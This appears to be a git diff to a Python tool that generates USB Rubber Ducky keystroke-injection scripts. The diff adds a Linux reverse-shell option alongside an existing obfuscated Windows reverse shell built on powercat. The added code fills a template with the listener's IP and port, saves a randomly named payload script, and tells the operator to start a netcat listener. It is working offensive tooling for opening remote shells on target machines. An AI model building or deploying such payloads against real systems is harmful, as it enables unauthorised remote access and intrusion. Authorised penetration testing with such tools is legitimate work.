@@ -20,6 +20,7 @@ programdescription += " Tool made by H4. Creds for powercat go to https://github
 parser = argparse.ArgumentParser(description=programdescription, epilog=programepilog)
 parser.add_argument("-s", "--setup", help="initial setup", action="store_true", required=False)
 parser.add_argument("-wr", "--windowsReverse", help="creating an obfuscated Windows reverse shell", action="store_true", required=False)
+parser.add_argument("-lr", "--linuxReverse", help="creating a Linux reverse shell (tested under Ubuntu 22.04.3)", action="store_true", required=False)
 parser.add_argument("-l", "--listener", help="IP and port of shell listener. Format: IP:PORT (needed for -wr option)", required=False, type=str)
 parser.add_argument("-pp", "--payloadProvider", help="server which provides the obfuscated powercat version. Format: IP:PORT (needed for -wr option)", required=False, type=str)
 args = parser.parse_args()
@@ -27,6 +28,47 @@ args = parser.parse_args()
 if args.setup:
     print("[#] 1. Downloading powercat (https://github.com/besimorhino/powercat) for Windows reverse shell payload...")
     os.system('curl -s https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 > resources/powercat.ps1')
+
+if args.linuxReverse:
+    if args.listener:
+        shellListenerIP = args.listener.split(":")[0]
+        shellListenerPort = args.listener.split(":")[1]
+
+    print("")
+    print("[#] Selected payload: Linux reverse shell (tested under Ubuntu 22.04.3)")
+    print("")
+    print("[#] 1. Are all parameters correct?")
+    print("[#]\tshell listener IP: " + shellListenerIP)
+    print("[#]\tshell listener PORT: " + str(shellListenerPort))
+    parametersCorrect = input("[#] Y/N? ")
+    if parametersCorrect != "Y":
+        print("[-] Good bye!")
+        print("")
+        sys.exit(0)
+    print("")
+
+    print("[#] 2. Creating ducky script payload...")
+    f = open("templates/ubuntu_reverse_shell.txt", "r")
+    duckyScript = f.readlines()
+    f.close()
+    duckyScriptContent = ""
+    for line in duckyScript:
+        if "<SHELLIP>" in line:
+            line = line.replace("<SHELLIP>", shellListenerIP)
+        if "<SHELLPORT>" in line:
+            line = line.replace("<SHELLPORT>", shellListenerPort)
+        duckyScriptContent += line
+    scriptFilename =  get_random_string(8) + "_ubuntu_reverse_shell.txt"
+    f = open("generated_scripts/" + scriptFilename, "w")
+    f.write(duckyScriptContent)
+    f.close()
+    print("[+] Ducky script payload wrote to generated_scripts/" + scriptFilename) 
+    print("")
+
+    print("[#] Before you use the ducky script perform the following steps.")
+    print("[#]\t1. Start the shell listener on " + shellListenerIP + ": nc -lvp " + shellListenerPort)
+    print("")
+    print("[+] Good bye! Have fun with the ducky script.")
 
 if args.windowsReverse:
     obfuscatedFilename = get_random_string(8)
